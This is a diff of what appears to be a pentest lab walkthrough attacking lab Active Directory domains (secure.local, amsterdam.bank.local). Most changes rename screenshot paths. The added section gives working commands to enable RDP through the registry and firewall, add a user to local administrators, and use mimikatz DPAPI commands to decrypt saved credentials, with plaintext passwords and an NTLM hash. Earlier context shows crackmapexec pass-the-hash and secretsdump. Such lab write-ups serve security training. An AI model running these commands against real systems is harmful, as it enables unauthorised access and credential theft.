@@ -92,7 +92,7 @@ bloodhound-python -d amsterdam.bank.local -ns 10.0.0.3 -dc DC02.amsterdam.bank.l
 
 2\. We now can load the data into BloodHound by draggin the zip file into it and see if Richard can do anything usefull:
 
-![](<../../../../.gitbook/assets/image (62) (1).png>)
+![](<../../../../.gitbook/assets/image (62) (1) (1).png>)
 
 Richard is member of the following groups, nothing interesting there:
 
@@ -191,7 +191,7 @@ EXECUTE AS LOGIN = 'Developer'
 
 But we get an error, because the user Developer can't use the database we are currently connected to:&#x20;
 
-![](<../../../../.gitbook/assets/image (45).png>)
+![](<../../../../.gitbook/assets/image (45) (1).png>)
 
 We can change the database to master; and try it again:
 
@@ -229,7 +229,7 @@ WHERE a.permission_name = 'IMPERSONATE'
 EXECUTE AS LOGIN = 'sa'
 ```
 
-![](<../../../../.gitbook/assets/image (46) (1).png>)
+![](<../../../../.gitbook/assets/image (46) (1) (1).png>)
 
 6\. Lets try to impersonate `developer_test` and then check for sysadmin privileges and if impersonation is possible again:
 
@@ -283,7 +283,7 @@ RECONFIGURE
 
 Now we can try to execute the whoami command again and it worked:
 
-![](<../../../../.gitbook/assets/image (63).png>)
+![](<../../../../.gitbook/assets/image (63) (1).png>)
 
 3\. The next step is to gain a shell from WEB01. For this we need to prepare some files and setup a listerener before we execute a querie on the sql server.&#x20;
 
@@ -588,7 +588,7 @@ bloodhound-python -d secure.local -ns 10.0.0.100 -dc DC03.secure.local -u 'sa_sq
 
 We were able to successfully gather the BloodHound data. We can load it by dragging it into BloodHound like we did earlier. We can also find the `sa_sql` user now:
 
-![](<../../../../.gitbook/assets/image (13) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (13) (1) (1) (1).png>)
 
 4\. Click on the user and scroll down in the "Node Info" till the "Outbound Control Rights" section. If there is any data here, it means the object has control on another object. Lets click on the number "1".
 
@@ -600,7 +600,7 @@ We see that the user has WriteOwner permissions:
 
 In BloodHound you can right click the Edge and click the ?Help function to get more information on how to abuse it:
 
-![](<../../../../.gitbook/assets/image (13) (1).png>)
+![](<../../../../.gitbook/assets/image (13) (1) (1).png>)
 
 5\. One tool to do these ACL abuses is [PowerView](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1) from PowerSploit. So lets download that and load it into memory in the shell we have on `WEB01`.
 
@@ -618,7 +618,7 @@ $creds = New-Object System.Management.Automation.PSCredential('secure.local\sa_s
 
 The credentials are saved in the `$creds` variable now:
 
-![](<../../../../.gitbook/assets/image (46).png>)
+![](<../../../../.gitbook/assets/image (46) (1).png>)
 
 6\. Now we can use PowerView to query the domain controller from `secure.local` for the domain-object `DATA01` and retrieve the samaccountname and Owner attribute. We will receive a SID which we need to resolve as well;
 
@@ -753,7 +753,7 @@ secretsdump.py -k -no-pass data01.secure.local
 crackmapexec smb 10.0.0.101 -u administrator -H a59cc2e81b2835c6b402634e584a8edc -x whoami
 ```
 
-![](<../../../../.gitbook/assets/image (13).png>)
+![](<../../../../.gitbook/assets/image (13) (1).png>)
 
 17\. We could get a shell the same way as we did before.
 
@@ -805,19 +805,62 @@ For some reason I kept getting errors, even If I gained a shell as `sa_sql` thro
 
 ![](<../../../../.gitbook/assets/image (35).png>)
 
+We could always just enable RDP with the following commands:
 
+```
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f 
+netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
+```
 
+We also have to add our user to the local admin group and Remote Desktop Users group:
 
+```
+net localgroup administrators sa_sql /add 
+net localgroup "Remote Desktop Users" sa_sql /add
+```
 
+![](<../../../../.gitbook/assets/image (13).png>)
 
+If we scan with Nmap now port 3389 is open:
 
+![](<../../../../.gitbook/assets/image (45).png>)
 
+We now can RDP into the machine with for example Xfreerdp:
 
+```
+xfreerdp /u:'secure\sa_sql' /p:Iloveyou2 /v:10.0.0.101
+```
 
+If we now run the same Mimikatz.exe command we receive the masterkey:
 
+```
+./mimikatz.exe "dpapi::masterkey /in:C:\Users\sa_sql\AppData\Roaming\Microsoft\Protect\S-1-5-21-1498997062-1091976085-892328878-1106\e1f462bb-9a65-40f0-a144-4f64bea97ce2 /sid:S-1-5-21-1498997062-1091976085-892328878-1106 /password:Iloveyou2 /protected" "exit"
+```
 
+![](<../../../../.gitbook/assets/image (62).png>)
 
+7\. Now we can read the saved credentials with the masterkey using the following Mimikatz command:
 
+```
+./mimikatz.exe "dpapi::cred /in:C:\Users\sa_sql\AppData\Roaming\Microsoft\Credentials\02BF8752741C7A447536E822E53153CD /masterkey:b3e8630e96acba990f836b4462a9285a4c987776f17f11b2559d9fdf67d03cf6b99dd89445d5641aef6f4477f7354eb6f19e3053e1d56712f45bc227249cdea2" "exit"
+```
+
+![](<../../../../.gitbook/assets/image (63).png>)
+
+We recived a credentials for the `sa_backup` user, the password is `LS6RV5o8T9`. We can quickly check if this is correct with Crackmapexec:
+
+```
+crackmapexec smb 10.0.0.100 -u sa_backup -p LS6RV5o8T9
+```
+
+![](<../../../../.gitbook/assets/image (46).png>)
+
+The login is succesfull, so the password is correct. The last thing to do is to remove the tools we placed on the machine and we should disable RDP again to not leave any changes to the system.
+
+```
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f 
+netsh advfirewall firewall set rule group="remote desktop" new enable=No
+```
 
 ### 12. Privileged groups
 
